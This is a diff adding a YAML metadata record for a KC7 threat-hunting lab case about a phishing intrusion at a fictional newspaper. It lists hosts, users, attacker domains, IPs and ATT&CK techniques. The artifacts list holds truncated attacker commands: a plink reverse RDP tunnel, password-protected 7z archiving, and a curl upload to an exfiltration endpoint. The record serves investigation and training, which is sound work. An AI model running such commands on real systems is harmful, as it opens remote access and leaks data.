@@ -1,0 +1,39 @@
+# cases/kc7-c01-scandal-in-valdoria/CaseMetadata.yaml
+id: kc7-c01
+title: "A Scandal in Valdoria"
+source: KC7
+status: complete                 # was: ongoing
+date_start: 2024-01-05
+date_end: "2024-02-01 02:14:32"  # last malicious activity observed
+systems:
+  - hostname: A37A-DESKTOP
+    ip: 10.10.0.19
+    owner: "Ronnie McLovin"
+    username: romclovin
+  - hostname: UL0M-MACHINE
+    ip: 10.10.0.3
+    owner: "Sonia Gose"
+    username: sogose
+users:
+  - name: "Ronnie McLovin"
+    username: romclovin
+    role: "Editorial Intern"
+  - name: "Sonia Gose"
+    username: sogose
+    role: "Senior Editor"
+data_sources: [Email, OutboundNetworkEvents, FileCreationEvents, ProcessEvents, Employees]
+techniques: [T1566, T1204, T1059.001, T1053.005, T1090, T1041]
+infrastructure:
+  domains: [promotionrecruit.com, promotionrecruit.org, hire-recruit.org, hirejob.com]
+  ips: [136.130.190.181, 168.57.191.100]
+artifacts:
+  - "C:\\ProgramData\\hacktivist_manifesto.ps1"
+  - "plink.exe -R 3389:localhost:3389 ..."
+  - "C:\\Users\\romclovin\\Documents\\OpEdFinal_to_print.docx"
+  - "7z.exe a -t7z ... -p <redacted>"
+  - "curl https://hirejob.com/exfil_processor/upload.php ..."
+outcome: "Data exfiltration confirmed; content tampering via fake op-ed"
+recommendations_ref: "04_Summary.md#recommendations"
+followups:
+  detection_engineering: planned   # planned | in_progress | done
+  workbook: planned
